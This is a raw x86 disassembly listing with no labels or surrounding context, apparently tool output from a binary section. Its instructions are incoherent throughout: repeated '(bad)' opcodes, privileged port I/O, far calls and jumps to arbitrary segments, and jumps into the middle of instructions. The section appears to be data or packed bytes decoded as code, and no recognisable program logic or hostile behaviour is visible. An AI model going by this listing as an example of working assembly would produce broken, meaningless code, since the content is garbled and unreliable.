  419089:	ins    BYTE PTR es:[edi],dx
  41908a:	push   edx
  41908b:	ja     0x419026
  41908d:	adc    ecx,ebx
  41908f:	dec    esp
  419090:	sbb    bl,dl
  419092:	scas   eax,DWORD PTR es:[edi]
  419093:	mov    bh,0xa8
  419095:	sub    ebx,DWORD PTR [edi+0x39c1f121]
  41909b:	xchg   DWORD PTR [esi+0x4c],esi
  41909e:	xor    DWORD PTR [ebx+0x25],eax
  4190a1:	mul    edi
  4190a3:	scas   al,BYTE PTR es:[edi]
  4190a4:	js     0x41909d
  4190a6:	in     eax,dx
  4190a7:	stos   BYTE PTR es:[edi],al
  4190a8:	fcom   DWORD PTR [ebx+0x53]
  4190ab:	rol    BYTE PTR [eax+0x24],1
  4190ae:	pop    ds
  4190af:	push   ss
  4190b0:	pop    ecx
  4190b1:	js     0x419099
  4190b3:	ficom  DWORD PTR [ebp-0x6]
  4190b6:	std    
  4190b7:	xchg   edx,eax
  4190b8:	lea    eax,[esi-0x72bd5c51]
  4190be:	gs (bad) 
  4190c0:	aad    0x89
  4190c2:	pop    ss
  4190c3:	push   edx
  4190c4:	ins    BYTE PTR es:[edi],dx
  4190c5:	xor    edi,DWORD PTR [ebp-0x1f]
  4190c8:	sub    BYTE PTR [edx],dl
  4190ca:	fstp   QWORD PTR [edi+0xe]
  4190cd:	mov    ah,ch
  4190cf:	add    esp,DWORD PTR [ebx]
  4190d1:	cld    
  4190d2:	sub    al,0xc9
  4190d4:	in     al,dx
  4190d5:	cmp    dl,BYTE PTR [ebp+0x7b]
  4190d8:	inc    ebp
  4190d9:	sbb    BYTE PTR [ebp-0x383bb94a],al
  4190df:	xchg   edi,eax
  4190e0:	test   DWORD PTR [edx+0xc],ecx
  4190e3:	adc    cl,BYTE PTR [ebp+0x76afc7f5]
  4190e9:	std    
  4190ea:	pop    edi
  4190eb:	cmp    al,0x3
  4190ed:	out    dx,al
  4190ee:	xor    ebx,DWORD PTR [edx+0x1b]
  4190f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190f2:	lock pusha 
  4190f4:	sub    esi,DWORD PTR [ebx-0x11]
  4190f7:	out    dx,eax
  4190f8:	dec    eax
  4190f9:	ins    BYTE PTR es:[edi],dx
  4190fa:	mov    ebx,0x90b33036
  4190ff:	push   ds
  419100:	xchg   ebx,eax
  419101:	rol    BYTE PTR [ecx+0x57028d85],cl
  419107:	loopne 0x4190d5
  419109:	repz mov ecx,0xe8d855f6
  41910f:	outs   dx,DWORD PTR ds:[esi]
  419110:	cmp    edi,DWORD PTR [edi+0x3e5f63ca]
  419116:	repnz cld 
  419118:	mov    eax,0xb599dd14
  41911d:	call   0x6f68:0x60c86287
  419124:	push   eax
  419125:	int    0x68
  419127:	mov    ds:0x48d0c955,al
  41912c:	leave  
  41912d:	pop    esp
  41912e:	push   esp
  41912f:	daa    
  419130:	cli    
  419131:	xchg   ebx,eax
  419132:	adc    al,0x59
  419134:	iret   
  419135:	pop    ebp
  419136:	push   es
  419137:	cmp    al,0x95
  419139:	sbb    al,0x83
  41913b:	repz stc 
  41913d:	mov    dh,0x1a
  41913f:	pop    ebp
  419140:	and    eax,0x91be2bff
  419145:	or     ebx,DWORD PTR [esi+eiz*2+0x4b]
  419149:	stos   DWORD PTR es:[edi],eax
  41914a:	test   eax,0x27497b02
  41914f:	pop    edi
  419150:	jo     0x419112
  419152:	repnz repnz (bad) 
  419155:	fdivr  QWORD PTR [ebp-0x104cb6db]
  41915b:	mov    al,0xa8
  41915d:	push   cs
  41915e:	sub    BYTE PTR [ebx+0x61],ch
  419161:	sub    al,0xe4
  419163:	enter  0xe20,0xf0
  419167:	lds    esp,FWORD PTR [ebp-0x19]
  41916a:	push   ds
  41916b:	stc    
  41916c:	push   cs
  41916d:	pushf  
  41916e:	inc    esi
  41916f:	in     eax,dx
  419170:	add    DWORD PTR [edx],0xffffff9f
  419173:	add    DWORD PTR [ebx],ebp
  419175:	in     eax,0x47
  419177:	imul   esp,esp,0x30
  41917a:	out    dx,al
  41917b:	test   al,0xf3
  41917d:	mov    al,0xc9
  41917f:	xchg   ecx,eax
  419180:	out    dx,al
  419181:	jne    0x419129
  419183:	test   al,0xe0
  419185:	dec    eax
  419186:	cld    
  419187:	hlt    
  419188:	sub    DWORD PTR [eax+eax*8],ebx
  41918b:	mov    ds:0x86b87e92,eax
  419190:	jns    0x419120
  419192:	sub    bh,BYTE PTR [ebp+0x10]
  419195:	push   0x9f4542dc
  41919a:	lock leave 
  41919c:	mov    eax,ds:0x53f33f6f
  4191a1:	inc    eax
  4191a2:	addr16 pop esi
  4191a4:	(bad)  
  4191a5:	push   esi
  4191a6:	rcr    esi,cl
  4191a8:	pop    edi
  4191a9:	sub    al,0x80
  4191ab:	lods   eax,DWORD PTR ds:[esi]
  4191ac:	or     dh,ch
  4191ae:	das    
  4191af:	sub    DWORD PTR [ebx+0x39000bc3],ecx
  4191b5:	dec    ebp
  4191b6:	aad    0xdd
  4191b8:	sub    bh,al
  4191ba:	xchg   ecx,eax
  4191bb:	xlat   BYTE PTR ds:[ebx]
  4191bc:	shr    BYTE PTR [ecx],cl
  4191be:	cmp    DWORD PTR [esi],0x714abf01
  4191c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191c5:	add    DWORD PTR [ebx],esp
  4191c7:	xor    eax,0xe72998ae
  4191cc:	cmp    dh,ch
  4191ce:	out    dx,eax
  4191cf:	jbe    0x4191a4
  4191d1:	lods   eax,DWORD PTR ds:[esi]
  4191d2:	adc    bl,BYTE PTR [edi]
  4191d4:	add    BYTE PTR fs:[ebp+0x1f],0xf6
  4191d9:	sar    BYTE PTR [edx+0x3c7f52e3],cl
  4191df:	cwde   
  4191e0:	cmp    DWORD PTR [edx],ebp
  4191e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191e3:	mov    edi,0xe14ce301
  4191e8:	ret    0x880e
  4191eb:	push   ecx
  4191ec:	cmp    ch,BYTE PTR [ebp+0x5a]
  4191ef:	bound  esi,QWORD PTR [edx-0x5c4ef135]
  4191f5:	add    BYTE PTR [ecx],cl
  4191f7:	mov    edi,0x24961e6b
  4191fc:	das    
  4191fd:	out    dx,eax
  4191fe:	dec    esi
  4191ff:	add    al,0xa9
  419201:	cld    
  419202:	jmp    0xf4f6610d
  419207:	outs   dx,DWORD PTR ds:[esi]
  419208:	loope  0x4191a0
  41920a:	and    BYTE PTR [ebp-0x67],bh
  41920d:	sub    bh,ah
  41920f:	in     al,dx
  419210:	imul   edx,esp,0xffffffb6
  419213:	inc    ecx
  419214:	add    bh,BYTE PTR [ebx+0xf138bd2]
  41921a:	sub    BYTE PTR [ebx],dh
  41921c:	bound  ecx,QWORD PTR [edx]
  41921e:	(bad)  
  41921f:	jo     0x419211
  419221:	xor    ah,BYTE PTR [ecx-0x47d2855c]
  419227:	repnz inc edi
  419229:	pop    edx
  41922a:	lods   eax,DWORD PTR ds:[esi]
  41922b:	add    esi,DWORD PTR [esp+ebx*4+0x57da1937]
  419232:	mov    eax,ds:0x2abe6b42
  419237:	dec    ebp
  419238:	shl    bl,cl
  41923a:	pop    eax
  41923b:	push   ss
  41923c:	xchg   edi,eax
  41923d:	xor    eax,0x82d582f4
  419242:	ss mov ah,0x7b
  419245:	into   
  419246:	jb     0x41926f
  419248:	mov    ds:0xf7f7c88e,eax
  41924d:	sub    edi,DWORD PTR [edi+0x2cf913e4]
  419253:	ret    
  419254:	scas   al,BYTE PTR es:[edi]
  419255:	jb     0x419239
  419257:	inc    ebx
  419258:	cmp    DWORD PTR [edx+0x3b47d5c9],edx
  41925e:	rdpmc  
  419260:	sti    
  419261:	or     edi,DWORD PTR [ecx]
  419263:	and    eax,0x8093bb7f
  419268:	in     al,0xde
  41926a:	mov    ah,0xd1
  41926c:	pushf  
  41926d:	add    bh,al
  41926f:	xchg   esp,eax
  419270:	iret   
  419271:	test   al,0x3a
  419273:	push   eax
  419274:	adc    BYTE PTR [ecx],dh
  419276:	adc    eax,0x1f044224
  41927b:	and    ebp,0x46
  41927e:	sbb    DWORD PTR [ecx-0x24746d0a],eax
  419284:	mov    WORD PTR [eax+0x63ab70e4],gs
  41928a:	xchg   edi,eax
  41928b:	push   edx
  41928c:	sub    ebp,DWORD PTR [edx-0x114a4876]
  419292:	adc    BYTE PTR [ecx+0x15e9a223],bl
  419298:	loope  0x4192db
  41929a:	fdiv   st(4),st
  41929c:	in     al,dx
  41929d:	xor    esp,DWORD PTR [edi]
  41929f:	jnp    0x4192a5
  4192a1:	(bad)  
  4192a2:	lds    esp,FWORD PTR [ebx+ecx*2-0x3b]
  4192a6:	lahf   
  4192a7:	in     eax,dx
  4192a8:	out    0x9,eax
  4192aa:	and    BYTE PTR [ebx-0x571c764b],ah
  4192b0:	loopne 0x41925a
  4192b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b3:	bound  eax,QWORD PTR [ebp+0x65cc1a5d]
  4192b9:	je     0x419309
  4192bb:	and    DWORD PTR [edi-0x4e],eax
  4192be:	fcom   QWORD PTR [edi]
  4192c0:	add    eax,DWORD PTR [esi]
  4192c2:	adc    al,0x76
  4192c4:	jb     0x41926a
  4192c6:	jb     0x419333
  4192c8:	nop
  4192c9:	inc    ebp
  4192ca:	mov    bh,BYTE PTR [ebp+0x75c7899e]
  4192d0:	or     eax,0xb9a8342
  4192d5:	pop    esi
  4192d6:	add    dh,BYTE PTR [ebx-0x31]
  4192d9:	mov    esp,0xbf1e091c
  4192de:	int3   
  4192df:	and    edx,DWORD PTR [edx]
  4192e1:	jg     0x41932f
  4192e3:	aad    0x28
  4192e5:	cmp    BYTE PTR [edx],al
  4192e7:	fdiv   st(6),st
  4192e9:	cmp    al,0x63
  4192eb:	stc    
  4192ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ed:	out    0x47,al
  4192ef:	or     BYTE PTR [ecx+edi*1+0x41],cl
  4192f3:	retf   0x4db7
  4192f6:	adc    al,0x2
  4192f8:	ret    0x904a
  4192fb:	jg     0x41936c
  4192fd:	stos   BYTE PTR es:[edi],al
  4192fe:	fwait
  4192ff:	cli    
  419300:	imul   ebp,DWORD PTR [edx+eax*4],0x2c1d81b
  419307:	jbe    0x4192ac
  419309:	dec    eax
  41930a:	add    cl,0x38
  41930d:	fimul  WORD PTR [eax+0x49]
  419310:	in     eax,0x1d
  419312:	mov    si,0xc0a9
  419316:	call   0xa3d61b03
  41931b:	fidivr DWORD PTR [edi]
  41931d:	imul   ebx,DWORD PTR [esi-0x6d03ede6],0xfffffff3
  419324:	mov    esp,0x7565abe5
  419329:	stos   DWORD PTR es:[edi],eax
  41932a:	mov    ebp,DWORD PTR [ebx+0x48]
  41932d:	mov    bl,0xba
  41932f:	jp     0x4192eb
  419331:	fdivp  st(0),st
  419333:	fdivr  st(3),st
  419335:	es inc edx
  419337:	bound  esp,QWORD PTR [ebp+0x14200e7d]
  41933d:	(bad)
  419340:	pop    ds
  419341:	div    DWORD PTR [ebx+0x235ff069]
  419347:	out    dx,eax
  419348:	dec    ecx
  419349:	mov    ah,0xaa
  41934b:	add    al,0x42
  41934d:	push   0xa743c2fa
  419352:	sbb    al,0xb
  419354:	cmp    ah,BYTE PTR [edi+0x315cdf1e]
  41935a:	adc    eax,DWORD PTR [esi]
  41935c:	mov    esi,0x84ca2b8a
  419361:	xchg   ebp,eax
  419362:	rcr    BYTE PTR [esi-0x29148218],1
  419368:	cld    
  419369:	jno    0x4193b3
  41936b:	inc    eax
  41936c:	adc    al,0x7b
  41936e:	adc    al,0x7d
  419370:	sub    eax,DWORD PTR [edi-0x32bda969]
  419376:	test   DWORD PTR [eax],edx
  419378:	stos   DWORD PTR es:[edi],eax
  419379:	sub    al,0xf3
  41937b:	push   esi
  41937c:	shl    DWORD PTR [edx+ecx*4],1
  41937f:	sub    bh,ch
  419381:	push   ecx
  419382:	pop    eax
  419383:	push   esp
  419384:	and    esp,DWORD PTR [esp+ecx*8-0x76]
  419388:	ins    BYTE PTR es:[edi],dx
  419389:	(bad)  
  41938a:	aaa    
  41938b:	test   eax,0xd58b24d0
  419390:	pop    ds
  419391:	ss mov ah,0xdd
  419394:	xchg   DWORD PTR [ebx+0x5e4e2309],edi
  41939a:	das    
  41939b:	mov    ch,0xf1
  41939d:	mov    BYTE PTR [ebp*2+0x5ad6f613],cl
  4193a4:	int    0x31
  4193a6:	loope  0x419409
  4193a8:	fs data16 jmp 0x4193f0
  4193ac:	cmp    ah,BYTE PTR [esi+0x20c6c9e]
  4193b2:	push   0x2ad9d3d4
  4193b7:	and    ch,BYTE PTR [ebp-0x64b6593c]
  4193bd:	shl    BYTE PTR [esp+eax*8+0x12],1
  4193c1:	test   BYTE PTR [eax-0x23],bl
  4193c4:	add    BYTE PTR [ebp-0x5b],dh
  4193c7:	mov    cs,WORD PTR [edx-0x88cfa37]
  4193cd:	out    dx,eax
  4193ce:	jl     0x4193cc
  4193d0:	stos   BYTE PTR es:[edi],al
  4193d1:	mov    cl,0xc5
  4193d3:	gs fwait
  4193d5:	jno    0x4193b8
  4193d7:	fdiv   DWORD PTR [ecx+0x73]
  4193da:	xor    BYTE PTR [ecx],dl
  4193dc:	sub    BYTE PTR [esi-0x7f],0xbe
  4193e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193e1:	adc    DWORD PTR [esi-0xe8730b5],ecx
  4193e7:	rcr    dl,0x77
  4193ea:	les    esi,FWORD PTR [ebp+edi*1-0x3092c4b0]
  4193f1:	mov    bh,0x37
  4193f3:	pop    eax
  4193f4:	xor    BYTE PTR [edx+0x3ccb3512],ch
  4193fa:	(bad)  
  4193fb:	xchg   edi,eax
  4193fc:	(bad)  
  4193fd:	ja     0x41942c
  4193ff:	adc    al,0x9c
  419401:	shr    ebx,0x4f
  419404:	push   0xffffffe6
  419406:	lods   al,BYTE PTR ds:[esi]
  419407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419408:	mov    ebp,0xe9f63a2e
  41940d:	mov    ecx,0x41ef8cfc
  419412:	ror    DWORD PTR [esi-0x5d],cl
  419415:	lea    eax,[ebp+0x76]
  419418:	test   eax,0x5ce9ab3a
  41941d:	pop    esp
  41941e:	sar    BYTE PTR [eax],0x67
  419421:	ds xchg ecx,eax
  419423:	or     eax,0x39fd209f
  419428:	ret    0xec02
  41942b:	sbb    DWORD PTR [edi+0x4b1f7931],eax
  419431:	jmp    0x9b2b:0x2263a63d
  419438:	loopne 0x4193cb
  41943a:	sbb    DWORD PTR [edi],0x4a33b490
  419440:	cli    
  419441:	pop    eax
  419442:	outs   dx,BYTE PTR ds:[esi]
  419443:	dec    edx
  419444:	push   edi
  419445:	jne    0x419408
  419447:	aaa    
  419448:	int    0xb7
  41944a:	(bad)  
  41944b:	mov    BYTE PTR [edi-0x1ed8050a],ch
  419451:	jb     0x4194b7
  419453:	mov    eax,0x41ed6b82
  419458:	add    ah,bh
  41945a:	sub    al,0xc2
  41945c:	dec    esi
  41945d:	and    DWORD PTR [ebx+edi*1],esi
  419460:	xlat   BYTE PTR ds:[ebx]
  419461:	push   eax
  419462:	mov    DWORD PTR ds:[ecx-0xc],edi
  419466:	add    BYTE PTR [ebp+0x546b07af],dh
  41946c:	fidivr WORD PTR [edi+edi*2-0x6e]
  419470:	sbb    al,0xbd
  419472:	cmp    DWORD PTR [esi+0x28],esp
  419475:	je     0x419461
  419477:	les    edi,FWORD PTR [ecx-0x3d0bd809]
  41947d:	loope  0x4194e1
  41947f:	ins    BYTE PTR es:[edi],dx
  419480:	inc    esp
  419481:	mov    al,0x87
  419483:	call   0x645c82de
  419488:	in     al,dx
  419489:	push   edx
  41948a:	xor    eax,0xb5abd764
  41948f:	ror    WORD PTR [esi+0x63179c57],1
  419496:	sub    BYTE PTR [edi],0xdd
  419499:	clc    
  41949a:	or     al,0x4
  41949c:	or     ch,BYTE PTR [eax+0x22]
  41949f:	inc    BYTE PTR [esi-0xe37a309]
  4194a5:	(bad)  
  4194a6:	xor    BYTE PTR [edi+0x55],ah
  4194a9:	out    0xa5,eax
  4194ab:	inc    ebp
  4194ac:	psraw  mm6,mm6
  4194af:	mov    ch,0x28
  4194b1:	movntq QWORD PTR [eax-0x6cbf9c0e],mm0
  4194b8:	inc    ebx
  4194b9:	inc    esp
  4194ba:	sbb    eax,DWORD PTR [ebp+ecx*1+0x64]
  4194be:	sub    edi,ebp
  4194c0:	js     0x4194a2
  4194c2:	dec    esi
  4194c3:	faddp  st(4),st
  4194c5:	je     0x4194bd
  4194c7:	out    0xdf,al
  4194c9:	pop    ebx
  4194ca:	mov    dh,0xd2
  4194cc:	ins    BYTE PTR es:[edi],dx
  4194cd:	sub    eax,0x49a214fb
  4194d2:	and    dh,BYTE PTR [eax]
  4194d4:	test   eax,0x7d385345
  4194d9:	dec    esp
  4194da:	dec    esp
  4194db:	leave  
  4194dc:	adc    eax,0x2fe6c99f
  4194e1:	xchg   ecx,eax
  4194e2:	(bad)  
  4194e3:	out    0x4,al
  4194e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e6:	mov    al,ds:0x88d82b84
  4194eb:	xor    ebp,DWORD PTR [edx]
  4194ed:	pop    ecx
  4194ee:	out    dx,eax
  4194ef:	dec    esi
  4194f0:	mov    cl,0xfb
  4194f2:	dec    esi
  4194f3:	xor    BYTE PTR [ecx],bh
  4194f5:	fisttp QWORD PTR [ebx+0x5e]
  4194f8:	gs mov bh,0x90
  4194fb:	inc    ebp
  4194fc:	outs   dx,BYTE PTR ds:[esi]
  4194fd:	sbb    bl,BYTE PTR [edi]
  4194ff:	cmp    ch,dh
  419501:	dec    edi
  419502:	out    dx,al
  419503:	call   0x230d7e96
  419508:	xchg   ebp,eax
  419509:	jbe    0x4194be
  41950b:	mov    esp,0x4954bfda
  419510:	mov    dh,BYTE PTR [edi+0x41bdb9e]
  419516:	jno    0x4194dd
  419518:	jnp    0x419524
  41951a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41951b:	jae    0x4194c3
  41951d:	les    ebp,FWORD PTR [esi]
  41951f:	call   0x8f0faebc
  419524:	mov    esi,DWORD PTR [ecx-0x61]
  419527:	pop    ds
  419528:	adc    cl,BYTE PTR [eax-0x2900643]
  41952e:	das    
  41952f:	(bad)  
  419530:	jnp    0x4194e1
  419532:	inc    edx
  419533:	pop    es
  419534:	imul   BYTE PTR [edi-0x6cf38b4a]
  41953a:	lahf   
  41953b:	mov    esp,0xe464ae51
  419540:	inc    eax
  419541:	mov    bh,0x69
  419543:	retf   
  419544:	out    0x6a,eax
  419546:	imul   ecx,DWORD PTR [esp+ebx*2-0x355d194c],0x82fc85e4
  419551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419552:	xchg   ecx,eax
  419553:	call   0x72dcd3fe
  419558:	inc    esi
  419559:	ror    BYTE PTR [eax+ecx*1-0x4],1
  41955d:	fsub   QWORD PTR [eax]
  41955f:	sub    DWORD PTR [ebp-0x7f9a8004],edi
  419565:	adc    DWORD PTR [ecx],ebp
  419567:	jp     0x4195de
  419569:	stos   BYTE PTR es:[edi],al
  41956a:	out    dx,eax
  41956b:	dec    esp
  41956c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41956d:	(bad)
  419570:	push   ebx
  419571:	scas   eax,DWORD PTR es:[edi]
  419572:	jb     0x41957b
  419574:	xchg   ecx,eax
  419575:	xchg   ebx,eax
  419576:	(bad)  
  419577:	out    dx,al
  419578:	aam    0x87
  41957a:	in     eax,dx
  41957b:	xor    al,0x5e
  41957d:	push   eax
  41957e:	in     al,0x5d
  419580:	inc    esp
  419581:	stos   BYTE PTR es:[edi],al
  419582:	pop    esp
  419583:	data16 neg dl
  419586:	xchg   edi,eax
  419587:	and    BYTE PTR [ecx],bh
  419589:	and    BYTE PTR [edx+0x2b2473df],al
  41958f:	icebp  
  419590:	mov    cl,0x86
  419592:	scas   eax,DWORD PTR es:[edi]
  419593:	pop    edi
  419594:	xchg   esp,eax
  419595:	and    BYTE PTR [edx],cl
  419597:	pusha  
  419598:	cmp    eax,0xb1967f61
  41959d:	test   bl,al
  41959f:	or     DWORD PTR [esi-0x47],eax
  4195a2:	mov    bl,0x11
  4195a4:	push   ds
  4195a5:	stos   BYTE PTR es:[edi],al
  4195a6:	das    
  4195a7:	arpl   WORD PTR [ebx-0x1732adfe],bp
  4195ad:	xchg   esi,eax
  4195ae:	jo     0x4195b7
  4195b0:	daa    
  4195b1:	shl    BYTE PTR [edx+0x55],cl
  4195b4:	xchg   ebp,eax
  4195b5:	push   DWORD PTR [eax-0x48]
  4195b8:	in     al,dx
  4195b9:	push   0x3b860b28
  4195be:	push   es
  4195bf:	sbb    bh,BYTE PTR [edi]
  4195c1:	dec    ebx
  4195c2:	mov    ds:0xfaff22d6,eax
  4195c7:	test   BYTE PTR [ecx+0x63bc4970],bh
  4195cd:	lea    ecx,[edi]
  4195cf:	push   es
  4195d0:	xor    esp,ebp
  4195d2:	outs   dx,BYTE PTR ds:[esi]
  4195d3:	push   ebp
  4195d4:	sbb    al,cl
  4195d6:	ret    
  4195d7:	cmp    BYTE PTR [edi+0x56489110],ah
  4195dd:	mov    edi,gs
  4195df:	lods   al,BYTE PTR ds:[esi]
  4195e0:	fiadd  WORD PTR [ecx+0x1558ac64]
  4195e6:	sbb    cl,BYTE PTR [ebx]
  4195e8:	pop    ds
  4195e9:	mov    dh,0x1e
  4195eb:	or     cl,BYTE PTR [ecx]
  4195ed:	push   eax
  4195ee:	aam    0xfe
  4195f0:	add    DWORD PTR [eax+0x58],0xd03235cc
  4195f7:	pop    ds
  4195f8:	popf   
  4195f9:	push   0xcae963b4
  4195fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ff:	sbb    al,0x32
  419601:	and    DWORD PTR [edx+0x3a],eax
  419604:	xchg   ebx,eax
  419605:	sbb    eax,ecx
  419607:	or     eax,0x1108a0e1
  41960c:	sti    
  41960d:	outs   dx,DWORD PTR ds:[esi]
  41960e:	push   edx
  41960f:	pop    ebx
  419610:	xchg   esi,eax
  419611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419612:	jne    0x4195be
  419614:	imul   ecx,DWORD PTR [ebp-0x5fa71481],0xffffff83
  41961b:	pop    esi
  41961c:	mov    gs,ebx
  41961e:	(bad)  
  41961f:	jns    0x419653
  419621:	push   DWORD PTR [eax]
  419623:	rol    bh,0x77
  419626:	ins    BYTE PTR es:[edi],dx
  419627:	lods   eax,DWORD PTR ds:[esi]
  419628:	stos   BYTE PTR es:[edi],al
  419629:	popa   
  41962a:	sbb    ch,al
  41962c:	arpl   bp,sp
  41962e:	int3   
  41962f:	inc    ebp
  419630:	xchg   ebp,eax
  419631:	sbb    BYTE PTR [eax-0x50],bh
  419634:	mov    ds:0xa64b6386,al
  419639:	pop    edi
  41963a:	cmp    eax,0x55cea620
  41963f:	loope  0x4195f9
  419641:	(bad)  
  419642:	call   0xd21f8055
  419647:	adc    DWORD PTR [ebx-0x41],ecx
  41964a:	out    dx,al
  41964b:	cwde   
  41964c:	inc    ecx
  41964d:	sub    cl,bl
  41964f:	mov    dl,0x78
  419651:	push   cs
  419652:	mov    DWORD PTR [edi-0x7a],ecx
  419655:	nop
  419656:	lock les eax,FWORD PTR [esi-0x68deeccb]
  41965d:	cli    
  41965e:	and    edx,DWORD PTR [ebp+0x22cf750b]
  419664:	sub    edx,ebx
  419666:	stos   DWORD PTR es:[edi],eax
  419667:	adc    esi,DWORD PTR [eax+0x37]
  41966a:	and    al,0xc3
  41966c:	data16 xor bh,BYTE PTR [ecx+0x527cd52a]
  419673:	or     al,0xbc
  419675:	lods   eax,DWORD PTR ds:[esi]
  419676:	mov    eax,ds:0xe1d9431e
  41967b:	ins    DWORD PTR es:[edi],dx
  41967c:	and    al,0x2c
  41967e:	ret    
  41967f:	jae    0x41962c
  419681:	popf   
  419682:	pop    ds
  419683:	dec    esi
  419684:	pop    ds
  419685:	leave  
  419686:	shr    esp,cl
  419688:	gs mov dl,al
  41968b:	sub    al,0xa5
  41968d:	xor    DWORD PTR [ecx],edi
  41968f:	int3   
  419690:	mov    dl,0xce
  419692:	pop    ss
  419693:	sbb    bh,cl
  419695:	push   ebp
  419696:	mov    ds:0xfa91cd71,al
  41969b:	ss mov ah,0x73
  41969e:	fcomp  QWORD PTR [edx+0x0]
  4196a1:	add    bh,bl
  4196a3:	sub    bl,0x50
  4196a6:	push   edi
  4196a7:	(bad)  
  4196a8:	or     esp,DWORD PTR [eax]
  4196aa:	ss int 0xa3
  4196ad:	push   ebx
  4196ae:	test   eax,0xd2877ed8
  4196b3:	sbb    al,0x3d
  4196b5:	stc    
  4196b6:	mov    al,ds:0x5bdaf0e
  4196bc:	dec    ebp
  4196bd:	repnz pop esp
  4196bf:	add    bh,al
  4196c1:	jecxz  0x4196ba
  4196c3:	jl     0x41965f
  4196c5:	jl     0x419743
  4196c7:	pop    ebx
  4196c8:	jmp    0x422f9aad
  4196cd:	push   ebx
  4196ce:	xlat   BYTE PTR ds:[ebx]
  4196cf:	mov    cl,0xa1
  4196d1:	add    BYTE PTR [eax+0x402b1faa],0xea
  4196d8:	ret    
  4196d9:	xchg   esi,eax
  4196da:	pop    ebp
  4196db:	or     eax,0xb9e95b08
  4196e1:	push   ss
  4196e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e3:	and    bl,ah
  4196e5:	call   0x3274:0xc2e45a44
  4196ec:	and    ebx,ebp
  4196ee:	(bad)  
  4196ef:	jnp    0x419720
  4196f1:	loop   0x419711
  4196f3:	dec    edx
  4196f4:	push   ecx
  4196f5:	arpl   WORD PTR cs:[eax+esi*4],sp
  4196f9:	in     al,0x50
  4196fb:	xor    al,BYTE PTR [ecx-0x39]
  4196fe:	or     DWORD PTR [edi+0x3a],ebp
  419701:	icebp  
  419702:	mov    eax,0x63786f94
  419707:	add    eax,0x53671b2e
  41970c:	cwde   
  41970d:	imul   esp,edi,0x5
  419710:	out    dx,al
  419711:	xchg   dx,ax
  419713:	or     al,0x1e
  419715:	ret    
  419716:	xchg   edi,eax
  419717:	loope  0x41973a
  419719:	sub    DWORD PTR [eax],eax
  41971b:	mov    WORD PTR [edi-0x36],fs
  41971e:	fwait
  41971f:	lock lds ebx,FWORD PTR gs:[ebx-0x675eb50a]
  419727:	mov    ecx,0x84312850
  41972c:	cs dec ecx
  41972e:	nop
  41972f:	pop    eax
  419730:	js     0x4197a8
  419732:	pop    ebp
  419733:	arpl   WORD PTR [esi+0x5f],bp
  419736:	mov    ch,0xbc
  419738:	mov    BYTE PTR [esi],bl
  41973a:	sbb    al,0x39
  41973c:	sbb    BYTE PTR ds:0xe1ca,dh
  419741:	xchg   ebx,eax
  419742:	push   ebp
  419743:	xor    eax,0xd61da33b
  419748:	jmp    0x611c2bb9
  41974d:	sbb    eax,0xa7aaa5a9
  419752:	pop    ebx
  419753:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  419755:	push   0xd308d0ef
  41975a:	out    dx,eax
  41975b:	xor    BYTE PTR [edx+0x50896540],ch
  419761:	pop    gs
  419763:	(bad)  
  419765:	scas   al,BYTE PTR es:[edi]
  419766:	(bad)  
  419767:	cli    
  419768:	loop   0x4197d2
  41976a:	xchg   ebx,eax
  41976b:	sub    ecx,ebp
  41976d:	dec    edi
  41976e:	push   ebp
  41976f:	loope  0x4197c3
  419771:	pop    es
  419772:	test   DWORD PTR [edi-0x56d6cccc],0x1e16e8cb
  41977c:	aam    0xa3
  41977e:	pop    esi
  41977f:	pop    esi
  419780:	dec    ecx
  419781:	or     BYTE PTR [ebp+0x4c0ad4a3],0x39
  419788:	mov    WORD PTR [esi+edx*2+0x4b94a4c4],es
  41978f:	jns    0x4197ac
  419791:	dec    esp
  419792:	and    BYTE PTR [edx+0x7a9ceed],ah
  419798:	pusha  
  419799:	fldcw  WORD PTR [edx]
  41979b:	xchg   ecx,eax
  41979c:	dec    ecx
  41979d:	loop   0x419738
  41979f:	xchg   DWORD PTR [edx-0x473d5682],ebp
  4197a5:	ins    DWORD PTR es:[edi],dx
  4197a6:	jo     0x419752
  4197a8:	sbb    eax,0x8bde3ba3
  4197ad:	imul   eax,DWORD PTR [eax+eax*8],0x22
  4197b1:	sub    eax,DWORD PTR [ebp+0x14]
  4197b4:	pushf  
  4197b5:	jmp    0xbbd5c52b
  4197ba:	test   dl,bh
  4197bc:	popa   
  4197bd:	icebp  
  4197be:	(bad)  
  4197bf:	int    0x36
  4197c1:	ja     0x4197d1
  4197c3:	add    al,0xd5
  4197c5:	pop    edi
  4197c6:	stos   DWORD PTR es:[edi],eax
  4197c7:	mov    esp,0x6c750742
  4197cc:	mov    edi,0x7258aaca
  4197d1:	clc    
  4197d2:	xor    al,0xf3
  4197d4:	xchg   edi,eax
  4197d5:	aaa    
  4197d6:	jmp    0x716d:0x8d24b09a
  4197dd:	sbb    ecx,esp
  4197df:	inc    edi
  4197e0:	enter  0x6ad3,0xc8
  4197e4:	sub    dl,BYTE PTR [edi-0x1bf6213]
  4197ea:	xor    al,0x56
  4197ec:	mov    ah,0x64
  4197ee:	fnstcw WORD PTR [eax+ebp*8]
  4197f1:	pop    ecx
  4197f2:	cdq    
  4197f3:	lock adc al,0x60
  4197f6:	data16 lahf 
  4197f8:	adc    eax,eax
  4197fa:	test   esp,edi
  4197fc:	loop   0x419873
  4197fe:	or     eax,DWORD PTR [edx]
  419800:	(bad)  
  419801:	int3   
  419802:	xchg   ebp,eax
  419803:	call   0x1264:0xbbf89c30
  41980a:	cmp    dh,al
  41980c:	push   ss
  41980d:	inc    ebx
  41980e:	pop    ds
  41980f:	daa    
